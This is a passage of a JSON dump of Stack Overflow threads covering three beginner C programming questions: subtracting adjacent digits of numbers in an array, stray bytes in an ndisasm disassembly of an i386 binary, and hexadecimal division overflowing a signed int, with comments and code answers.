pre-split into an array of single digits, but your example input and expected results seem to suppose that it will perform multiple computations such as you describe, handling each array element as an independent input."}, {"owner": {"reputation": 199, "user_id": 3541440, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0cjHH.jpg?s=128&g=1", "display_name": "Jenny T-Type", "link": "https://stackoverflow.com/users/3541440/jenny-t-type"}, "edited": false, "score": 0, "creation_date": 1544651412, "post_id": 53751593, "comment_id": 94356496, "body": "And no, pointers do not save you from passing the <i>size</i> (number of elements) of the array to a function, cause when you pass an array to a function it always decays to pointer, meaning your&#39;re actually passing a pointer to the first element of the array. and pointers do not keep track of the number of elements of the object they point to. whether the array is statically or dynamically allocated."}, {"owner": {"reputation": 13, "user_id": 10782940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a26b798ca85dd787e0ed20c22ffff21d?s=128&d=identicon&r=PG&f=1", "display_name": "protagorus", "link": "https://stackoverflow.com/users/10782940/protagorus"}, "reply_to_user": {"reputation": 1619, "user_id": 7864413, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208517922736756/picture?type=large", "display_name": "Phil M", "link": "https://stackoverflow.com/users/7864413/phil-m"}, "edited": false, "score": 0, "creation_date": 1544651657, "post_id": 53751593, "comment_id": 94356613, "body": "@PhilM actually it calculates each element individually (135 is 22 because 5-3 and 3-1 --&gt; 22)"}, {"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 0, "creation_date": 1544651763, "post_id": 53751593, "comment_id": 94356652, "body": "Split the problem. Write a function taking an <code>int</code> which substracts digit wise. Then write a function taking an array and size and do it for each element."}, {"owner": {"reputation": 13, "user_id": 10782940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a26b798ca85dd787e0ed20c22ffff21d?s=128&d=identicon&r=PG&f=1", "display_name": "protagorus", "link": "https://stackoverflow.com/users/10782940/protagorus"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1544651945, "post_id": 53751593, "comment_id": 94356731, "body": "@JohnBollinger Maybe it was confusing to put that there, those are just part of automated testing; the process should be simple \u2013 user inputs a number (which should be read as an array) and the function should subtract the digits as I described"}, {"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 0, "creation_date": 1544652035, "post_id": 53751593, "comment_id": 94356780, "body": "Your array elements are independent of each other, you do not need other elements to calculate your current one, right?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1544652293, "post_id": 53751593, "comment_id": 94356916, "body": "@protagorus, &quot;just automated testing&quot; does not make sense.  The code you present is feeding different input to your function than what you describe, and apparently has different expectations of the function&#39;s behavior than you describe.  I don&#39;t see how there&#39;s an answer here different from &quot;you&#39;re using the function wrongly.&quot;"}, {"owner": {"reputation": 13, "user_id": 10782940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a26b798ca85dd787e0ed20c22ffff21d?s=128&d=identicon&r=PG&f=1", "display_name": "protagorus", "link": "https://stackoverflow.com/users/10782940/protagorus"}, "reply_to_user": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 0, "creation_date": 1544652348, "post_id": 53751593, "comment_id": 94356931, "body": "@Osiris yep, each one is calculated individually - 55, 56, 65, 135 (5-5, 5-6, 6-5, 5-3 and 3-1 make 0, 1, 1, 22)"}, {"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 0, "creation_date": 1544652411, "post_id": 53751593, "comment_id": 94356959, "body": "Then you should start with a function that calculates it for one <code>int</code>. After that you just need to loop over the array."}, {"owner": {"reputation": 13, "user_id": 10782940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a26b798ca85dd787e0ed20c22ffff21d?s=128&d=identicon&r=PG&f=1", "display_name": "protagorus", "link": "https://stackoverflow.com/users/10782940/protagorus"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1544652738, "post_id": 53751593, "comment_id": 94357103, "body": "@JohnBollinger Let me try to explain it again (ignoring the examples above): user inputs a number, for example 38279. the function should subtract the digits from that number (9-7, 7-2, 2-8, 8-3) and print the new number: 5652. that&#39;s about it. Those examples i put up there are just part of tests which are used to check if the function is working right, nothing more"}, {"owner": {"reputation": 13, "user_id": 10782940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a26b798ca85dd787e0ed20c22ffff21d?s=128&d=identicon&r=PG&f=1", "display_name": "protagorus", "link": "https://stackoverflow.com/users/10782940/protagorus"}, "reply_to_user": {"reputation": 199, "user_id": 3541440, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0cjHH.jpg?s=128&g=1", "display_name": "Jenny T-Type", "link": "https://stackoverflow.com/users/3541440/jenny-t-type"}, "edited": false, "score": 0, "creation_date": 1544653005, "post_id": 53751593, "comment_id": 94357202, "body": "@JennyT-Type this function works when the array has a defined size. the thing is, i don&#39;t know how to make it work when the array size if undefined. and i also don&#39;t know how to scan the elements without \\n or any space between them (to input it just like 1345, without having to hit enter or space)"}, {"owner": {"reputation": 13, "user_id": 10782940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a26b798ca85dd787e0ed20c22ffff21d?s=128&d=identicon&r=PG&f=1", "display_name": "protagorus", "link": "https://stackoverflow.com/users/10782940/protagorus"}, "reply_to_user": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 0, "creation_date": 1544653052, "post_id": 53751593, "comment_id": 94357223, "body": "@Osiris how do i do it if i don&#39;t know the array size?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1544653151, "post_id": 53751593, "comment_id": 94357266, "body": "@protagorus, explaining what you want to achieve in comments does not solve the problems with this question.  I deduced early on what you want the function to do.  Although it <i>is</i> a problem that that&#39;s not clear from the question itself, it is even more a problem that it&#39;s unclear how you&#39;re actually calling the function and how you&#39;re actually observing the results you describe.  So please, edit the question to present a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> that demonstrates the problem, as indeed is our usual expectation here."}, {"owner": {"reputation": 175, "user_id": 9805734, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4ff9b2a45d9046d42dd5927c5af93d7?s=128&d=identicon&r=PG&f=1", "display_name": "Sean Monroe", "link": "https://stackoverflow.com/users/9805734/sean-monroe"}, "edited": false, "score": 0, "creation_date": 1544653273, "post_id": 53751593, "comment_id": 94357313, "body": "@protagorus The question isn&#39;t very well formed; you imply that you want to know why your test is repeating your input numbers, and that was answered twice in these comments and once in an answer. What you appear to be asking in these comments are &quot;how do I work with an array of unknown size&quot; which has also been answered: &quot;you don&#39;t&quot;. Can you rephrase the question incorporating the comments to clarify what you need done?"}, {"owner": {"reputation": 13, "user_id": 10782940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a26b798ca85dd787e0ed20c22ffff21d?s=128&d=identicon&r=PG&f=1", "display_name": "protagorus", "link": "https://stackoverflow.com/users/10782940/protagorus"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1544654257, "post_id": 53751593, "comment_id": 94357705, "body": "@JohnBollinger i understand, I&#39;ll edit it, sorry!"}, {"owner": {"reputation": 13, "user_id": 10782940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a26b798ca85dd787e0ed20c22ffff21d?s=128&d=identicon&r=PG&f=1", "display_name": "protagorus", "link": "https://stackoverflow.com/users/10782940/protagorus"}, "reply_to_user": {"reputation": 175, "user_id": 9805734, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4ff9b2a45d9046d42dd5927c5af93d7?s=128&d=identicon&r=PG&f=1", "display_name": "Sean Monroe", "link": "https://stackoverflow.com/users/9805734/sean-monroe"}, "edited": false, "score": 0, "creation_date": 1544655468, "post_id": 53751593, "comment_id": 94358139, "body": "@SeanMonroe true, i didn&#39;t really phrase it right, I&#39;m fixing it, sorry!"}, {"owner": {"reputation": 372, "user_id": 10669066, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zo0wL.jpg?s=128&g=1", "display_name": "Holy semicolon", "link": "https://stackoverflow.com/users/10669066/holy-semicolon"}, "edited": false, "score": 0, "creation_date": 1544656759, "post_id": 53751593, "comment_id": 94358543, "body": "@protagorus by the way the output for 38279 is 2565 not 5652"}, {"owner": {"reputation": 13, "user_id": 10782940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a26b798ca85dd787e0ed20c22ffff21d?s=128&d=identicon&r=PG&f=1", "display_name": "protagorus", "link": "https://stackoverflow.com/users/10782940/protagorus"}, "reply_to_user": {"reputation": 372, "user_id": 10669066, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zo0wL.jpg?s=128&g=1", "display_name": "Holy semicolon", "link": "https://stackoverflow.com/users/10669066/holy-semicolon"}, "edited": false, "score": 0, "creation_date": 1544657332, "post_id": 53751593, "comment_id": 94358733, "body": "@HeIs ohhh i actually forgot to clarify this! it&#39;s subtracting from right to left and reading the values ALSO from right to left (9-7=2, 7-2=5, 2-8=-6, 8-3=5; so from right to left it&#39;s 5652)"}], "answers": [{"comments": [{"owner": {"reputation": 2176, "user_id": 5402401, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/dPV49.jpg?s=128&g=1", "display_name": "0.sh", "link": "https://stackoverflow.com/users/5402401/0-sh"}, "edited": false, "score": 0, "creation_date": 1544651867, "post_id": 53751777, "comment_id": 94356696, "body": "how does this answer the question ?"}, {"owner": {"reputation": 13, "user_id": 10782940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a26b798ca85dd787e0ed20c22ffff21d?s=128&d=identicon&r=PG&f=1", "display_name": "protagorus", "link": "https://stackoverflow.com/users/10782940/protagorus"}, "edited": false, "score": 0, "creation_date": 1544652162, "post_id": 53751777, "comment_id": 94356852, "body": "that part is actually working when user inputs both size and number. it returns the right value. the thing is, i don&#39;t know how to make it work when the size of the array is undefined (that&#39;s why those examples up there don&#39;t work)"}], "tags": [], "owner": {"reputation": 129, "user_id": 4187641, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/515988629/picture?type=large", "display_name": "Bregell", "link": "https://stackoverflow.com/users/4187641/bregell"}, "is_accepted": false, "score": 0, "last_activity_date": 1544650790, "creation_date": 1544650790, "answer_id": 53751777, "question_id": 53751593, "link": "https://stackoverflow.com/questions/53751593/a-function-that-works-with-array-elements/53751777#53751777", "title": "a function that works with array elements", "body": "<p>You are not actually changing any values, here is the line you need to look at.</p>\n\n<pre><code>sub = sub * 10 + abs(arr[i] - arr[i+1]);\n</code></pre>\n\n<p>As you are printing the array you actually need to store the calculated value in the array again. </p>\n"}, {"comments": [{"owner": {"reputation": 13, "user_id": 10782940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a26b798ca85dd787e0ed20c22ffff21d?s=128&d=identicon&r=PG&f=1", "display_name": "protagorus", "link": "https://stackoverflow.com/users/10782940/protagorus"}, "edited": false, "score": 0, "creation_date": 1544659629, "post_id": 53753109, "comment_id": 94359351, "body": "It works!!!! Thank you so much for the time and effort you&#39;ve put in the writing of the whole code!!"}], "tags": [], "owner": {"reputation": 1619, "user_id": 7864413, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208517922736756/picture?type=large", "display_name": "Phil M", "link": "https://stackoverflow.com/users/7864413/phil-m"}, "is_accepted": false, "score": 0, "last_activity_date": 1544658576, "creation_date": 1544658576, "answer_id": 53753109, "question_id": 53751593, "link": "https://stackoverflow.com/questions/53751593/a-function-that-works-with-array-elements/53753109#53753109", "title": "a function that works with array elements", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint subtract(int n)\n{\n  int factor = 1;\n  int total = 0;\n  int lastPlace = n%10;\n  n /= 10;\n  while (n&gt;0)\n  {\n      total += (factor * abs((n%10) - lastPlace));\n      factor *= 10;\n      lastPlace = n%10;\n      n /= 10;\n  } \n  return total;\n}\n\nvoid subtractArray(int* arr, unsigned int size)\n{\n  for (int i=0; i&lt;size; ++i)\n  {\n    if (arr[i] &lt; 0)\n      arr[i] = abs(arr[i]);\n    arr[i] = subtract(arr[i]);\n  }\n}\n\nint main()\n{\n  int arr[] = {1, 2, 55, 56, 65, 135};\n  int size = sizeof(arr)/ sizeof(arr[0]);\n  subtractArray(arr, size);\n  for (int i=0; i&lt;size; ++i)\n  {\n    printf(\"%d \", arr[i]);\n  }\n  return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 372, "user_id": 10669066, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zo0wL.jpg?s=128&g=1", "display_name": "Holy semicolon", "link": "https://stackoverflow.com/users/10669066/holy-semicolon"}, "is_accepted": false, "score": 0, "last_activity_date": 1544660999, "creation_date": 1544660999, "answer_id": 53753381, "question_id": 53751593, "link": "https://stackoverflow.com/questions/53751593/a-function-that-works-with-array-elements/53753381#53753381", "title": "a function that works with array elements", "body": "<p>Here is a simple code that solve your problem :)</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint *subtraction(int arr[], int size) \n{\n    int *sub = calloc(sizeof(int*) , size), i = 0, rev;              //allocating memory \n    for (i = 0; i &lt; size; i++)\n    {    \n        rev = 0;\n        arr[i] = abs(arr[i]);\n\n        for (int a = 0; arr[i] != 0; arr[i] /= 10)\n            rev = (rev * 10) + (arr[i] % 10);\n\n        for (i; (rev / 10) != 0; rev /= 10)             //the loop ends when rev = 0\n            sub[i] = ((sub[i] * 10) + abs( (rev % 10) - ((rev / 10) % 10) ));    //easy math =&gt; for example rev = 21 &gt; sub[i] = (0 * 10) + ( (21 % 10) - ((21 / 10) %10)) = abs(1 - 2) = 1;\n    }\n    return sub;\n}\n\n\nint main()\n{\n    int arr[] = {-9533, 7, -19173}, i;\n    int len = sizeof(arr)/sizeof(arr[0]);  //size of arr\n    int *sub = subtraction(arr, len);\n\n    for(int i = 0; i &lt; len; i++)   //for test\n        printf(\"%d \", sub[i]);\n\n    return 0;\n}\n</code></pre>\n\n<p>output for {1, 2, 55, 56, 65, 135}:</p>\n\n<pre><code>0 0 0 1 1 22\n</code></pre>\n\n<p>output for {987654321, 123456789, 111111111} :</p>\n\n<pre><code>11111111 11111111 0\n</code></pre>\n\n<p>output for {38279}:</p>\n\n<pre><code>5652\n</code></pre>\n\n<p>output for {-9533, 7, -19173}:</p>\n\n<pre><code>420 0 8864\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 199, "user_id": 3541440, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0cjHH.jpg?s=128&g=1", "display_name": "Jenny T-Type", "link": "https://stackoverflow.com/users/3541440/jenny-t-type"}, "is_accepted": false, "score": 0, "last_activity_date": 1544661695, "creation_date": 1544661695, "answer_id": 53753451, "question_id": 53751593, "link": "https://stackoverflow.com/questions/53751593/a-function-that-works-with-array-elements/53753451#53753451", "title": "a function that works with array elements", "body": "<p>Well as for the <em>array of undefined size</em>. What you probably want is a <strong>dynamically allocated array</strong>.</p>\n\n<p>Here we get the number of array elements based on user input, within limits, of course.\nfirst we're gonna get the number from the user using <code>fgets()</code> which will give us a string, then we'll use <code>strtol()</code> to convert the number part to scalar (int). you can use <code>scanf(\"%d\", &amp;n)</code> if you want.</p>\n\n<p>Then we can count the digits from that number, and that value will be the number of elements of our array.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;     //for strtol(), malloc() and NULL guaranteed\n//you may also want to add \n#include &lt;limits.h&gt;\n#include &lt;errno.h&gt;\n\n#define MAX_STRLEN  12   // can hold all digits of INT_MAX plus '\\0' and a posible, AND very likely, '\\n'\n#define DEC 10           // for strtol base argument\n\n/*\n * I'm lending you my old get_n_dits() function that I used to count decimal digits.\n */\nint get_n_dits(int dnum) {\n\n    unsigned char stop_flag = 0;    //we'll use to signal we're done with the loop.\n\n    int  num_dits = 1, dpos_mult = 1;  //num_dits start initialized as 1, cause we're pretty sure that we're getting a number with at least one digit\n                                       //dpos_mult stands for digital position multiplier.\n    int check_zresult;  //we'll check if integer division yields zero.\n\n    /**\n     * Here we'll iterate everytime (dnum / dpost_mult) results in a non-zero value, we don't care for the remainder though, at least for this use.\n     * every iteration elevates dpost_mult to the next power of ten and every iteration yielding a non-zero result increments n_dits, once we get\n     * the zero result, we increment stop_flag, thus the loop condition is no longer true and we break from the loop.\n     */\n\n    while(!stop_flag) {\n\n        dpos_mult *= 10;\n        check_zresult = dnum / dpos_mult;\n        (check_zresult) ? num_dits++ : stop_flag++;\n    }\n\n    return num_dits;\n} \n\n\nint main(void) {\n\n    int num, ndits;                    //we'll still using int as per your code. you can check against INT_MAX if you want (defined in limits.h)\n    int *num_array = NULL;      //let's not unintentionally play with an unitialized pointer.\n    char *num_str = malloc(MAX_STRLEN);     //or malloc(sizeof(char) * MAX_STRLEN); if there's any indication that (sizeof(char) != 1)\n\n    printf(\"please enter a number... please be reasonable... or ELSE!\\n\");\n    printf(\"&gt;&gt;&gt; \");\n    if(!fgets(num_str, MAX_STRLEN, stdin)) {\n        fprintf(stderr, \"Error while reading from STDIN stream.\\n\");\n        return -1;\n    }\n\n    num = (int)strtol(num_str, NULL, DEC);  //convert the string from user input to scalar.\n    if(!num) {\n        fprintf(stderr, \"Error: no number found on input.\\n\");\n        return -1;\n    }\n\n    ndits = get_n_dits(num);\n\n    if(ndits &lt;= 0) {\n        fprintf(stderr, \"Aw, crap!\\n\");\n        return -1;\n    }\n\n    printf(\"number of digits: %d\\n\", ndits);\n\n    num_array = malloc(sizeof(int) * ndits);        //now we have our dynamically allocated array.\n\n    return 0;\n\n}  \n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 10782940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a26b798ca85dd787e0ed20c22ffff21d?s=128&d=identicon&r=PG&f=1", "display_name": "protagorus", "link": "https://stackoverflow.com/users/10782940/protagorus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 89, "favorite_count": 0, "answer_count": 4, "score": 0, "last_activity_date": 1544995897, "creation_date": 1544649896, "last_edit_date": 1544995897, "question_id": 53751593, "link": "https://stackoverflow.com/questions/53751593/a-function-that-works-with-array-elements", "title": "a function that works with array elements", "body": "<p>I need to write a function that subtracts digits.\nIf user inputs 2345, the output should be 111 (5-4, 4-3, 3-2); another example would be 683, where the output should be 25 (3-8(abs value is taken), 8-6).</p>\n\n<p>I have wrote the following code which works only when the size of the array is declared.</p>\n\n<pre><code>int subtraction(int arr[], int size) {\nint sub = 0;\nfor (int i = 0; i &lt; size-1; i++) {\n    sub = sub * 10 + abs(arr[i] - arr[i+1]);\n}\nreturn sub;\n}\n</code></pre>\n\n<p>However, the number that the user inputs is random and can have various digits, so I don't know what limit to put in the for loop.</p>\n\n<p>For example:</p>\n\n<pre><code>    int arr[] = {1, 2, 55, 56, 65, 135}, i;\n    subtraction(arr, 6);\n    for (i=0; i&lt;6; i++)\n         printf(\"%d \", arr[i]);\n</code></pre>\n\n<p>expected output: 0 0 0 1 1 22 </p>\n\n<p>The function is supposed to subtract the second-to-last digit from the last one, by the way , / from right to left / from a random number that the user inputs ; for example if the input is 5789, the output is supposed to be 211 (9-8, 8-7, 7-5); if user inputs a negative number, the program should take it's absolute value and then do the subtracting. If user input is a one digit number the result should be 0.</p>\n\n<p>The function I wrote only works when the size of the array is declared. I don't know how to make it work when the size is undeclared (pointers and malloc are required I believe, as that's what I managed to find out by googling for ages, but unfortunately, I don't know how to do it).</p>\n\n<p>please help?</p>\n"}, {"tags": ["c", "gcc", "assembly", "nasm"], "comments": [{"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 1, "creation_date": 1544673181, "post_id": 53751478, "comment_id": 94362170, "body": "compile with optimization enabled if you want the actual code for your function to not suck.  The function does nothing so it should be optimized to just a <code>ret</code>."}], "answers": [{"tags": [], "owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "is_accepted": true, "score": 3, "last_activity_date": 1544651352, "last_edit_date": 1544651352, "creation_date": 1544650477, "answer_id": 53751706, "question_id": 53751478, "link": "https://stackoverflow.com/questions/53751478/redundant-operations-in-disassembled-c-code/53751706#53751706", "title": "redundant operations in disassembled c code", "body": "<pre><code>0000000F  68656C6C6F        push dword 0x6f6c6c65\n</code></pre>\n\n<p><code>68 65 6c 6c 6f</code> is the string <code>\"hello\"</code>, from the <code>.rodata</code> section of the object file. The disassembly is nonsense.</p>\n\n<p>The rest of the data you're looking at is the contents of the <code>.eh_frame</code> section. <a href=\"https://stackoverflow.com/questions/14091231/what-do-the-eh-frame-and-eh-frame-hdr-sections-store-exactly/14091884\">This data is used for exception handling</a>, although in this case it's unused. As with the <code>.rodata</code> section, the disassembly of this data is nonsense.</p>\n\n<p>You can view the contents of these sections -- as well as a few other sections that weren't copied to the output file -- by running <code>objdump -D pointers.o</code>.</p>\n\n<p>To better control the format of your binary output, you can <a href=\"https://sourceware.org/binutils/docs/ld/Scripts.html\" rel=\"nofollow noreferrer\">write a linker script</a>.</p>\n"}], "owner": {"reputation": 121, "user_id": 9139880, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c153ffaa1dc1d8438ab02f44c1920180?s=128&d=identicon&r=PG", "display_name": "Anton Quelle", "link": "https://stackoverflow.com/users/9139880/anton-quelle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 0, "accepted_answer_id": 53751706, "answer_count": 1, "score": -1, "last_activity_date": 1544651352, "creation_date": 1544649401, "question_id": 53751478, "link": "https://stackoverflow.com/questions/53751478/redundant-operations-in-disassembled-c-code", "title": "redundant operations in disassembled c code", "body": "<p>I have a .c file containing the following code:</p>\n\n<pre><code>void func(){\n    char* string = \"hello\";\n}\n</code></pre>\n\n<p>which i compile and link using</p>\n\n<pre><code>i386-elf-gcc -ffreestanding -c pointers.c -o pointers.o\ni386-elf-ld -o pointers.bin -Ttext 0x0 --oformat binary pointers.o\n</code></pre>\n\n<p>and then disassemble using <code>ndisasm -b 32 pointers.bin</code>.\nThis yields:</p>\n\n<pre><code>00000000  55                push ebp\n00000001  89E5              mov ebp,esp\n00000003  83EC10            sub esp,byte +0x10\n00000006  C745FC0F000000    mov dword [ebp-0x4],0xf\n0000000D  C9                leave\n0000000E  C3                ret\n0000000F  68656C6C6F        push dword 0x6f6c6c65\n00000014  0000              add [eax],al\n00000016  0000              add [eax],al\n00000018  1400              adc al,0x0\n0000001A  0000              add [eax],al\n0000001C  0000              add [eax],al\n0000001E  0000              add [eax],al\n00000020  017A52            add [edx+0x52],edi\n00000023  0001              add [ecx],al\n00000025  7C08              jl 0x2f\n00000027  011B              add [ebx],ebx\n00000029  0C04              or al,0x4\n0000002B  0488              add al,0x88\n0000002D  0100              add [eax],eax\n0000002F  001C00            add [eax+eax],bl\n00000032  0000              add [eax],al\n00000034  1C00              sbb al,0x0\n00000036  0000              add [eax],al\n00000038  C8FFFFFF          enter 0xffff,0xff\n0000003C  0F0000            sldt [eax]\n0000003F  0000              add [eax],al\n00000041  41                inc ecx\n00000042  0E                push cs\n00000043  088502420D05      or [ebp+0x50d4202],al\n00000049  4B                dec ebx\n0000004A  C50C04            lds ecx,[esp+eax]\n0000004D  0400              add al,0x0\n0000004F  00                db 0x00\n</code></pre>\n\n<p>The top 7 lines clearly correspond to the c code shown above. However, what is the use of all the stuff after line 7? Examining the bin using xxd does not show intelligible text, so they don't seem to be comments. Is it related to my compiler/linker options?</p>\n"}, {"tags": ["c", "hex", "division", "integer-division"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1544649072, "post_id": 53751370, "comment_id": 94355468, "body": "Because <code>0x88555680</code> is not fitting into <i>signed</i> <code>int</code>. Check this one: <a href=\"https://ideone.com/vGJo1G\" rel=\"nofollow noreferrer\">ideone.com/vGJo1G</a>"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544692416, "post_id": 53751370, "comment_id": 94368976, "body": "The first chapters of a beginner-level C programming book should mention the numerical limits of <code>int</code>."}], "answers": [{"tags": [], "owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "is_accepted": true, "score": 3, "last_activity_date": 1544649077, "creation_date": 1544649077, "answer_id": 53751404, "question_id": 53751370, "link": "https://stackoverflow.com/questions/53751370/c-output-of-hexadecimal-division-different-from-all-other-sources/53751404#53751404", "title": "C output of hexadecimal division different from all other sources", "body": "<p>On common systems <code>int</code> is a 32-bit type whose max value is <code>0x7FFFFFFF</code>. Your value of <code>0x88555680</code> is out of range for <code>int</code>. The compiler should warn you about this; if you don't see a warning then I recommend adjusting compiler settings.</p>\n\n<p>Also your code causes undefined behaviour by using <code>%x</code> to print an <code>int</code>. The <code>%x</code> specifier may only be used for <code>unsigned int</code>.</p>\n\n<p>To fix your code in this case use <code>unsigned int</code> instead of <code>int</code> for all 3 variables.  If you want to deal with larger numbers you can use <code>unsigned long long</code>, or <code>uint64_t</code>. (In those cases you will need to update the printf format specifiers too).</p>\n"}], "owner": {"reputation": 1527, "user_id": 9439097, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1fLAA.png?s=128&g=1", "display_name": "charel-f", "link": "https://stackoverflow.com/users/9439097/charel-f"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 114, "favorite_count": 0, "accepted_answer_id": 53751404, "answer_count": 1, "score": -1, "last_activity_date": 1544649077, "creation_date": 1544648919, "question_id": 53751370, "link": "https://stackoverflow.com/questions/53751370/c-output-of-hexadecimal-division-different-from-all-other-sources", "title": "C output of hexadecimal division different from all other sources", "body": "<p>I want to divide two hex numbers: </p>\n\n<p>for example: <code>88555680/10000</code></p>\n\n<p>Now, from online hex calculators, I find:</p>\n\n<p><a href=\"https://www.calculator.net/hex-calculator.html?number1=88555680&amp;c2op=%2F&amp;number2=10000&amp;calctype=op&amp;x=33&amp;y=22\" rel=\"nofollow noreferrer\">8855 as result here</a></p>\n\n<p><a href=\"https://www.miniwebtool.com/hex-calculator/?number1=88555680&amp;operate=4&amp;number2=10000\" rel=\"nofollow noreferrer\">8855.568 as result here</a></p>\n\n<p>And in python I find:</p>\n\n<pre><code>&gt;&gt;&gt; 